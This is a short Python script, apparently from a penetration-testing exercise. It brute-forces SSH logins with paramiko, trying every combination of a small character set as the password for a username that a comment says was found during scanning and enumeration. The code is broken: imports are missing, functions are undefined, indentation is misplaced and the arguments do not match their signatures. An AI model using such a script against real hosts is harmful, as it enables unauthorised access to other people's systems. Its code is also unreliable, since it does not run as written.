import itertools as it
from utils import timefunc


class Battle_Ram:
    def __init__(self, charset, length):
        self.charset = charset
        self.length = length

    @timefunc
    def crackit(self, password):
        client = create_client()
        for guess in self.guesses:
            try:
                print(guess)
                client.connect(self.ip, username=username, password=guess, timeout=0.5)

                    print('The password is {}'.format(guess))
                    return guess
                except paramiko.AuthenticationException as e:
                    print('{} is not it.'.format(guess))
                finally:
                    client.close()

    @property
    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield  ''.join(guess)


def main():
    charset = 'aspeb'       # you could add whatever you like here
    ip = 'ip address'
    brute = Battle_Ram(charset, 4, ip)
    password = brute.crackit(username='usrname')        # he found the username during the scanning and enumeration phase
    if password:
        print('Found {}'.format(password))


if __name__ == '__main__':
    main()
